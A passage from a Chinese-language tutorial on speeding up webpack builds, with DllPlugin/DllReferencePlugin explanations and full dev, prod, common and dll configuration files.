<ul><li><p>前端框架如<code>react</code>、<code>vue</code>体积大，构建慢</p></li> <li><p>较稳定，不常升级版本，同一个版本只构建一次，不用每次都重新构建</p></li> <li><p><code>webpack</code>已内置<code>DllPlugin</code>，不需要安装</p></li> <li><p><code>DllPlugin</code>打包出<code>dll</code>文件</p></li> <li><p><code>DllReferencePlugin</code>引用<code>dll</code>文件</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// webpack.common.js</span>
<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> HtmlWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'html-webpack-plugin'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> srcPath<span class="token punctuation">,</span> distPath <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./paths'</span><span class="token punctuation">)</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">entry</span><span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>srcPath<span class="token punctuation">,</span> <span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">module</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">rules</span><span class="token operator">:</span> <span class="token punctuation">[</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.js$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
                <span class="token literal-property property">use</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'babel-loader'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token literal-property property">include</span><span class="token operator">:</span> srcPath<span class="token punctuation">,</span>
                <span class="token literal-property property">exclude</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">node_modules</span><span class="token regex-delimiter">/</span></span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">plugins</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token literal-property property">template</span><span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>srcPath<span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token literal-property property">filename</span><span class="token operator">:</span> <span class="token string">'index.html'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// webpack.dev.js</span>
<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> webpack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> merge <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack-merge'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> webpackCommonConf <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./webpack.common.js'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> srcPath<span class="token punctuation">,</span> distPath <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./paths'</span><span class="token punctuation">)</span>

<span class="token comment">// 第一，引入 DllReferencePlugin</span>
<span class="token keyword">const</span> DllReferencePlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack/lib/DllReferencePlugin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>webpackCommonConf<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'development'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">module</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">rules</span><span class="token operator">:</span> <span class="token punctuation">[</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.js$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
                <span class="token literal-property property">use</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'babel-loader'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token literal-property property">include</span><span class="token operator">:</span> srcPath<span class="token punctuation">,</span>
                <span class="token literal-property property">exclude</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">node_modules</span><span class="token regex-delimiter">/</span></span> <span class="token comment">// 第二，不要再转换 node_modules 的代码</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">plugins</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>DefinePlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token comment">// window.ENV = 'production'</span>
            <span class="token constant">ENV</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token string">'development'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token comment">// 第三，告诉 Webpack 使用了哪些动态链接库</span>
        <span class="token keyword">new</span> <span class="token class-name">DllReferencePlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token comment">// 描述 react 动态链接库的文件内容</span>
            <span class="token literal-property property">manifest</span><span class="token operator">:</span> <span class="token function">require</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>distPath<span class="token punctuation">,</span> <span class="token string">'react.manifest.json'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token literal-property property">devServer</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">port</span><span class="token operator">:</span> <span class="token number">8080</span><span class="token punctuation">,</span>
        <span class="token literal-property property">progress</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token comment">// 显示打包的进度条</span>
        <span class="token literal-property property">contentBase</span><span class="token operator">:</span> distPath<span class="token punctuation">,</span>  <span class="token comment">// 根目录</span>
        <span class="token literal-property property">open</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token comment">// 自动打开浏览器</span>
        <span class="token literal-property property">compress</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token comment">// 启动 gzip 压缩</span>

        <span class="token comment">// 设置代理</span>
        <span class="token literal-property property">proxy</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token comment">// 将本地 /api/xxx 代理到 localhost:3000/api/xxx</span>
            <span class="token string-property property">'/api'</span><span class="token operator">:</span> <span class="token string">'http://localhost:3000'</span><span class="token punctuation">,</span>

            <span class="token comment">// 将本地 /api2/xxx 代理到 localhost:3000/xxx</span>
            <span class="token string-property property">'/api2'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token string">'http://localhost:3000'</span><span class="token punctuation">,</span>
                <span class="token literal-property property">pathRewrite</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token string-property property">'/api2'</span><span class="token operator">:</span> <span class="token string">''</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// webpack.prod.js</span>
<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> webpack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> webpackCommonConf <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./webpack.common.js'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> merge <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack-merge'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> srcPath<span class="token punctuation">,</span> distPath <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./paths'</span><span class="token punctuation">)</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>webpackCommonConf<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'production'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">output</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">filename</span><span class="token operator">:</span> <span class="token string">'bundle.[contenthash:8].js'</span><span class="token punctuation">,</span>  <span class="token comment">// 打包代码时，加上 hash 戳</span>
        <span class="token literal-property property">path</span><span class="token operator">:</span> distPath<span class="token punctuation">,</span>
        <span class="token comment">// publicPath: 'http://cdn.abc.com'  // 修改所有静态文件 url 的前缀（如 cdn 域名），这里暂时用不到</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">plugins</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>DefinePlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token comment">// window.ENV = 'production'</span>
            <span class="token constant">ENV</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token string">'production'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// webpack.dll.js</span>

<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> DllPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack/lib/DllPlugin'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> srcPath<span class="token punctuation">,</span> distPath <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./paths'</span><span class="token punctuation">)</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
<span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'development'</span><span class="token punctuation">,</span>
<span class="token comment">// JS 执行入口文件</span>
<span class="token literal-property property">entry</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token comment">// 把 React 相关模块的放到一个单独的动态链接库</span>
    <span class="token literal-property property">react</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'react'</span><span class="token punctuation">,</span> <span class="token string">'react-dom'</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token literal-property property">output</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token comment">// 输出的动态链接库的文件名称，[name] 代表当前动态链接库的名称，</span>
    <span class="token comment">// 也就是 entry 中配置的 react 和 polyfill</span>
    <span class="token literal-property property">filename</span><span class="token operator">:</span> <span class="token string">'[name].dll.js'</span><span class="token punctuation">,</span>
    <span class="token comment">// 输出的文件都放到 dist 目录下</span>
    <span class="token literal-property property">path</span><span class="token operator">:</span> distPath<span class="token punctuation">,</span>
    <span class="token comment">// 存放动态链接库的全局变量名称，例如对应 react 来说就是 _dll_react</span>
    <span class="token comment">// 之所以在前面加上 _dll_ 是为了防止全局变量冲突</span>
    <span class="token literal-property property">library</span><span class="token operator">:</span> <span class="token string">'_dll_[name]'</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token literal-property property">plugins</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token comment">// 接入 DllPlugin</span>
    <span class="token keyword">new</span> <span class="token class-name">DllPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token comment">// 动态链接库的全局变量名称，需要和 output.library 中保持一致</span>
    <span class="token comment">// 该字段的值也就是输出的 manifest.json 文件 中 name 字段的值</span>
    <span class="token comment">// 例如 react.manifest.json 中就有 &quot;name&quot;: &quot;_dll_react&quot;</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'_dll_[name]'</span><span class="token punctuation">,</span>
    <span class="token comment">// 描述动态链接库的 manifest.json 文件输出时的文件名称</span>
    <span class="token literal-property property">path</span><span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>distPath<span class="token punctuation">,</span> <span class="token string">'[name].manifest.json'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-json extra-class"><pre class="language-json"><code><span class="token property">&quot;scripts&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">&quot;dev&quot;</span><span class="token operator">:</span> <span class="token string">&quot;webpack serve --config build/webpack.dev.js&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;dll&quot;</span><span class="token operator">:</span> <span class="token string">&quot;webpack --config build/webpack.dll.js&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
</code></pre></div></li></ul></li></ul> <p><strong>优化打包速度完整代码</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// webpack.common.js</span>

<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> HtmlWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'html-webpack-plugin'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> srcPath<span class="token punctuation">,</span> distPath <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./paths'</span><span class="token punctuation">)</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">entry</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">index</span><span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>srcPath<span class="token punctuation">,</span> <span class="token string">'index.js'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token literal-property property">other</span><span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>srcPath<span class="token punctuation">,</span> <span class="token string">'other.js'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">module</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">rules</span><span class="token operator">:</span> <span class="token punctuation">[</span>
            <span class="token comment">// babel-loader</span>
        <span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">plugins</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token comment">// new HtmlWebpackPlugin({</span>
        <span class="token comment">//     template: path.join(srcPath, 'index.html'),</span>
        <span class="token comment">//     filename: 'index.html'</span>
        <span class="token comment">// })</span>

        <span class="token comment">// 多入口 - 生成 index.html</span>
        <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token literal-property property">template</span><span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>srcPath<span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token literal-property property">filename</span><span class="token operator">:</span> <span class="token string">'index.html'</span><span class="token punctuation">,</span>
            <span class="token comment">// chunks 表示该页面要引用哪些 chunk （即上面的 index 和 other），默认全部引用</span>
            <span class="token literal-property property">chunks</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token string">'vendor'</span><span class="token punctuation">,</span> <span class="token string">'common'</span><span class="token punctuation">]</span>  <span class="token comment">// 要考虑代码分割</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token comment">// 多入口 - 生成 other.html</span>
        <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token literal-property property">template</span><span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>srcPath<span class="token punctuation">,</span> <span class="token string">'other.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token literal-property property">filename</span><span class="token operator">:</span> <span class="token string">'other.html'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">chunks</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'other'</span><span class="token punctuation">,</span> <span class="token string">'vendor'</span><span class="token punctuation">,</span> <span class="token string">'common'</span><span class="token punctuation">]</span>  <span class="token comment">// 考虑代码分割</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// webpack.dev.js</span>
<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> webpack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> webpackCommonConf <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./webpack.common.js'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> smart <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack-merge'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> srcPath<span class="token punctuation">,</span> distPath <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./paths'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> HotModuleReplacementPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack/lib/HotModuleReplacementPlugin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token function">smart</span><span class="token punctuation">(</span>webpackCommonConf<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'development'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">entry</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token comment">// index: path.join(srcPath, 'index.js'),</span>
        <span class="token literal-property property">index</span><span class="token operator">:</span> <span class="token punctuation">[</span>
            <span class="token string">'webpack-dev-server/client?http://localhost:8080/'</span><span class="token punctuation">,</span>
            <span class="token string">'webpack/hot/dev-server'</span><span class="token punctuation">,</span>
            path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>srcPath<span class="token punctuation">,</span> <span class="token string">'index.js'</span><span class="token punctuation">)</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token literal-property property">other</span><span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>srcPath<span class="token punctuation">,</span> <span class="token string">'other.js'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">module</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">rules</span><span class="token operator">:</span> <span class="token punctuation">[</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.js$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
                <span class="token literal-property property">loader</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'babel-loader?cacheDirectory'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token literal-property property">include</span><span class="token operator">:</span> srcPath<span class="token punctuation">,</span>
                <span class="token comment">// exclude: /node_modules/</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token comment">// 直接引入图片 url</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.(png|jpg|jpeg|gif)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
                <span class="token literal-property property">use</span><span class="token operator">:</span> <span class="token string">'file-loader'</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token comment">// {</span>
            <span class="token comment">//     test: /\.css$/,</span>
            <span class="token comment">//     // loader 的执行顺序是：从后往前</span>
            <span class="token comment">//     loader: ['style-loader', 'css-loader']</span>
            <span class="token comment">// },</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.css$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
                <span class="token comment">// loader 的执行顺序是：从后往前</span>
                <span class="token literal-property property">loader</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'style-loader'</span><span class="token punctuation">,</span> <span class="token string">'css-loader'</span><span class="token punctuation">,</span> <span class="token string">'postcss-loader'</span><span class="token punctuation">]</span> <span class="token comment">// 加了 postcss</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.less$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
                <span class="token comment">// 增加 'less-loader' ，注意顺序</span>
                <span class="token literal-property property">loader</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'style-loader'</span><span class="token punctuation">,</span> <span class="token string">'css-loader'</span><span class="token punctuation">,</span> <span class="token string">'less-loader'</span><span class="token punctuation">]</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">plugins</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>DefinePlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token comment">// window.ENV = 'production'</span>
            <span class="token constant">ENV</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token string">'development'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token keyword">new</span> <span class="token class-name">HotModuleReplacementPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token literal-property property">devServer</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">port</span><span class="token operator">:</span> <span class="token number">8080</span><span class="token punctuation">,</span>
        <span class="token literal-property property">progress</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token comment">// 显示打包的进度条</span>
        <span class="token literal-property property">contentBase</span><span class="token operator">:</span> distPath<span class="token punctuation">,</span>  <span class="token comment">// 根目录</span>
        <span class="token literal-property property">open</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token comment">// 自动打开浏览器</span>
        <span class="token literal-property property">compress</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token comment">// 启动 gzip 压缩</span>

        <span class="token literal-property property">hot</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>

        <span class="token comment">// 设置代理</span>
        <span class="token literal-property property">proxy</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token comment">// 将本地 /api/xxx 代理到 localhost:3000/api/xxx</span>
            <span class="token string-property property">'/api'</span><span class="token operator">:</span> <span class="token string">'http://localhost:3000'</span><span class="token punctuation">,</span>

            <span class="token comment">// 将本地 /api2/xxx 代理到 localhost:3000/xxx</span>
            <span class="token string-property property">'/api2'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token string">'http://localhost:3000'</span><span class="token punctuation">,</span>
                <span class="token literal-property property">pathRewrite</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token string-property property">'/api2'</span><span class="token operator">:</span> <span class="token string">''</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token comment">// watch: true, // 开启监听，默认为 false</span>
    <span class="token comment">// watchOptions: {</span>
    <span class="token comment">//     ignored: /node_modules/, // 忽略哪些</span>
    <span class="token comment">//     // 监听到变化发生后会等300ms再去执行动作，防止文件更新太快导致重新编译频率太高</span>
    <span class="token comment">//     // 默认为 300ms</span>
    <span class="token comment">//     aggregateTimeout: 300,</span>
    <span class="token comment">//     // 判断文件是否发生变化是通过不停的去询问系统指定文件有没有变化实现的</span>
    <span class="token comment">//     // 默认每隔1000毫秒询问一次</span>
    <span class="token comment">//     poll: 1000</span>
    <span class="token comment">// }</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// webpack.prod.js</span>
<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> webpack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> smart <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack-merge'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> CleanWebpackPlugin <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'clean-webpack-plugin'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> MiniCssExtractPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mini-css-extract-plugin'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> TerserJSPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'terser-webpack-plugin'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> OptimizeCSSAssetsPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'optimize-css-assets-webpack-plugin'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> HappyPack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'happypack'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> ParallelUglifyPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack-parallel-uglify-plugin'</span><span class="token punctuation">)</span>
